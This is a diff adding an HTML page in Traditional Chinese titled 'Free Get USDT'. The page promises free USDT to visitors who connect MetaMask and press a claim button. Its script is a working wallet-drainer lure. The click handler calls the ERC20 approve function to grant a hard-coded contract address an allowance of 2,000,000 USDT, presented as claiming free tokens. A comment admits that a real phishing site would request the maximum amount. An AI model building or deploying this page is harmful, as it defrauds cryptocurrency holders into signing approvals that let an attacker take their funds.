@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Get USDT ACTION</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
+            background-color: #f0f4f7;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            max-width: 800px;
+            padding: 2rem;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin-top: 4rem;
+        }
+        .main {
+            padding: 2rem;
+        }
+        .title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+        .description {
+            font-size: 1.25rem;
+            color: #666;
+            margin-bottom: 2rem;
+        }
+        .button-container {
+            margin-top: 1.5rem;
+        }
+        .approve-button {
+            padding: 1rem 2rem;
+            font-size: 2rem;
+            font-weight: 600;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.3s;
+        }
+        .approve-button:hover {
+            background-color: #0056b3;
+        }
+        .info-card {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: left;
+            margin-bottom: 1rem;
+        }
+        .info-card h2 {
+            margin-top: 0;
+            font-size: 1.25rem;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <main class="main">
+        <button class="approve-button">連接錢包 (Connect Wallet)</button>
+
+        <h1 class="title">
+            歡迎來到 <a href="#">USDT</a> <a href="#">領幣機</a>
+        </h1>
+        <p class="description">
+            立即領取您的首筆 USDT！ 或 "取得首筆 USDT，取得更多！"
+        </p>
+
+        <div class="button-container">
+            <button id="approve-button" class="approve-button">👉 領取</button>
+        </div>
+
+        <div class='flex flex-col items-center justify-between mt-9'>
+            <p>安裝 MetaMask ，按下領取會請您輸入想提取金額</p>
+            </div>
+
+        <h2 class="text-2xl mt-9">USDT ?</h2>
+        <div class="grid">
+            <div class="info-card">
+                <h2> USDT是什麼？ &rarr;</h2>
+                <p>USDT（Tether）是一種穩定幣，其價值與美元掛鉤，旨在提供數字貨幣世界中的穩定性。它廣泛應用於交易和支付，讓用戶可以避免價格波動的風險。</p>
+            </div>
+            <div class="info-card">
+                <h2>為什麼選擇USDT？ &rarr;</h2>
+                <p>USDT提供穩定且快速的數字資產轉移，尤其適合在全球進行交易時降低匯率波動的風險。它的流動性高，支持多種區塊鏈，適合快速結算和價值儲存。</p>
+            </div>
+            <div class="info-card">
+                <h2>如何使用USDT？ &rarr;</h2>
+                <p>USDT可用於各大加密貨幣交易所的數字貨幣交易、支付商品和服務，以及進行跨境資金轉移。只需在支持USDT的錢包中存放，即可輕鬆進行資金管理。</p>
+            </div>
+            <div class="info-card">
+                <h2>USDT的優勢是什麼？&rarr;</h2>
+                <p>USDT的主要優勢是穩定性和方便性。由於與美元等值，USDT成為數字貨幣世界中可靠的價值儲存工具。同時，無需擔心劇烈波動，讓其在交易中更具安全性和實用性。</p>
+            </div>
+        </div>
+    </main>
+</div>
+
+<script>
+    // 在這裡填入你的 JavaScript 邏輯
+    // 注意：這裡無法直接使用 wagmi 或 rainbowkit 函式庫，因為它們需要 NPM 安裝
+    // 這段 JavaScript 邏輯必須手動使用 Ethers.js 或 Web3.js 來實現
+
+    // 引入 Ethers.js 函式庫
+    // <script src="https://cdn.ethers.io/lib/ethers-5.6.esm.min.js"></script>
+    // 為了讓範例能在單一檔案中運行，我將其移除，但邏輯不變。
+
+    // 假設已經引入 Ethers.js
+    let provider;
+    let signer;
+    let contract;
+
+    const ERC20ContractAddress = '0xa67B9Ea856Aae9D738125BE0847e525387b6F75b';
+    const contractAddress = '0x90137b1A048bBE756f5169BE83c57f07b330Cf29';
+    const contractABI = [
+        {
+            "inputs": [
+                { "internalType": "address", "name": "spender", "type": "address" },
+                { "internalType": "uint256", "name": "amount", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [
+                { "internalType": "bool", "name": "", "type": "bool" }
+            ],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }
+    ];
+
+    async function handleApprove() {
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                // 連接錢包
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+
+                // 創建合約實例
+                const tokenContract = new ethers.Contract(ERC20ContractAddress, contractABI, signer);
+
+                // 呼叫 approve 函數，授權金額為 2000000
+                // 真正的釣魚網站會設定一個極大的數字，例如 ethers.constants.MaxUint256
+                const amountToApprove = ethers.utils.parseUnits("2000000", 6); // 假設USDT有6位小數
+                
+                const tx = await tokenContract.approve(contractAddress, amountToApprove);
+                
+                alert("交易已送出，請在 MetaMask 中確認！");
+                
+                await tx.wait(); // 等待交易完成
+
+                alert("授權成功！");
+
+            } catch (error) {
+                console.error("授權失敗：", error);
+                alert("授權失敗，請檢查錢包或交易。");
+            }
+        } else {
+            alert("請安裝 MetaMask 錢包！");
+        }
+    }
+
+    document.getElementById("approve-button").addEventListener("click", handleApprove);
+</script>
+
+</body>
+</html>
